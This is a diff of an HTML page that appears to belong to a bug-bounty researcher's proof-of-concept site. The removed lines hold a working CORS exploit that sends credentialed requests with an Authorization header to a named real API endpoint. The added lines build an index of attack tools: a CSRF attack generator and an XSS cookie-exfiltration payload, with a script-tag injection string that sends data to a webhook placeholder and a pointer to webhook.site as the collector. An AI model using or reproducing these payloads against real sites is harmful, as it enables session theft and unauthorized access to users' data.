@@ -1,49 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - Authorization Header Acceptance</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical PoC Testing Hub - Security Researcher</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 30px; background-color: #e8eaf6; color: #333; }
+        .header { background-color: #3f51b5; color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center; }
+        .container { background-color: white; padding: 25px; border-radius: 0 0 8px 8px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15); }
+        h1 { margin-top: 0; }
+        h2 { color: #3f51b5; border-bottom: 2px solid #3f51b5; padding-bottom: 5px; margin-top: 25px; }
+        .tool-link { display: block; padding: 15px; margin: 10px 0; background-color: #f0f4c3; border: 1px solid #cddc39; border-radius: 4px; text-decoration: none; color: #333; font-weight: bold; transition: background-color 0.3s; }
+        .tool-link:hover { background-color: #e6ee9c; }
+        code { background-color: #f4f4f4; padding: 2px 4px; border-radius: 3px; }
+        .warning { padding: 10px; background-color: #ffebee; border-left: 5px solid #f44336; color: #f44336; margin-top: 15px; font-weight: bold; }
+        .instructions { margin-top: 15px; padding: 10px; background-color: #e8f5e9; border-left: 5px solid #4caf50; }
+    </style>
 </head>
 <body>
-    <h1>CORS Misconfiguration PoC</h1>
-    <p>Demonstrates server accepts authenticated requests from *any* origin.</p>
-    <button onclick="testCORS()">Test with Fake Authorization Header</button>
-    <pre id="result"></pre>
+    <div class="header">
+        <h1>Ethical Web Security Testing Hub</h1>
+        <p>Proof of Concept (PoC) Tools for Authorized Security Research</p>
+    </div>
     
+    <div class="container">
+        <div class="warning">
+            **DISCLOSURE NOTE:** All tools and payloads hosted here are for **ethical testing** on targets where the researcher has **explicit, legal, and written authorization** to perform security assessments (Bug Bounty Programs or Authorized Penetration Testing).
+        </div>
+
+        <h2 id="base-url">Base Attacker URL: <code></code></h2>
+
+        <h2>Available PoC Generators</h2>
+        
+        <p>Use these links to access the dynamic PoC pages. Append the required parameters to the URL before sharing the PoC with triagers.</p>
+
+        <a id="link-cors" href="cors_test.html" class="tool-link">
+            CORS Misconfiguration Tester
+        </a>
+        <div class="instructions">
+            **Parameters:** <code>?target=VULNERABLE_ENDPOINT_URL</code>
+        </div>
+        
+        <a id="link-csrf" href="csrf_attack.html" class="tool-link">
+            CSRF Attack Generator (POST/Form)
+        </a>
+        <div class="instructions">
+            **Parameters:** <code>?url=VULNERABLE_ACTION_URL&param1=value1&param2=value2...</code>
+        </div>
+        
+        <a id="link-xss" href="xss_payload.js" class="tool-link">
+            XSS Cookie Exfiltration Payload (JS File)
+        </a>
+        <div class="instructions">
+            **How to use:** Inject a **script tag** pointing to this file. 
+            <br>
+            **Injection String Example:** <code>&lt;script src="</code><code id="xss-injection-example"></code><code>?log=WEBHOOK_URL"&gt;&lt;/script&gt;</code>
+        </div>
+
+        <h2>Logging Endpoint Requirement</h2>
+        <p>Since this site is static (GitHub Pages), a separate logging service is required for data exfiltration PoCs (XSS, SSRF OOB). Use an external collector like <a href="https://webhook.site" target="_blank">webhook.site</a> or a similar service for your <code>WEBHOOK_URL</code> placeholder.</p>
+
+    </div>
+
     <script>
-    function testCORS() {
-        var url = "https://api.maple.comcast.net/lookups/usersAddress96.99.226.63:443";
+        // Dynamically set the base URL for easy linking and instruction.
+        const baseUrl = window.location.href.split('?')[0].replace('index.html', '');
         
-        // This simulates a request where the attacker somehow obtained a valid token.
-        // The token is fake here to avoid unauthorized access, but it proves the *mechanism* works.
-        var fakeToken = "Bearer THIS_IS_A_FAKE_TOKEN_VALUE_TO_PROVE_THE_HEADER_CAN_BE_SENT";
+        document.getElementById('base-url').querySelector('code').textContent = baseUrl;
 
-        var xhr = new XMLHttpRequest();
-        xhr.onload = function() {
-            var statusText = "HTTP " + xhr.status;
-            
-            if (xhr.status === 401) {
-                // This is still a success! It proves the browser successfully sent the header cross-origin.
-                document.getElementById('result').innerHTML = "<b>CORS TEST SUCCESS:</b> The browser successfully sent the `Authorization` header cross-origin. The 401 status and body confirm the server received the header but rejected the token value.<br><br>Server Response: " + xhr.responseText;
-            } else if (xhr.status === 200) {
-                // Immediate Critical Win: Data stolen!
-                document.getElementById('result').innerHTML = "<b>CRITICAL SUCCESS (200 OK):</b> The attack token was accepted, and sensitive data was retrieved cross-origin:<br>" + xhr.responseText.substring(0, 500) + "...";
-            } else {
-                 document.getElementById('result').innerHTML = "Status: " + statusText + ". Response: " + xhr.responseText;
-            }
-        };
+        // Set the full URLs for the links
+        document.getElementById('link-cors').href = baseUrl + 'cors_test.html';
+        document.getElementById('link-csrf').href = baseUrl + 'csrf_attack.html';
         
-        xhr.onerror = function() {
-            document.getElementById('result').innerHTML = "Network Error - check console for details.";
-        };
-
-        xhr.open('GET', url, true);
-        xhr.withCredentials = true; // Send any relevant cookies too
-        
-        // **CRITICAL STEP:** Setting the Authorization header cross-origin
-        xhr.setRequestHeader('Authorization', fakeToken); 
-        
-        xhr.send();
-    }
+        // Show the correct path for the XSS injection string
+        document.getElementById('xss-injection-example').textContent = baseUrl + 'xss_payload.js';
     </script>
 </body>
 </html>
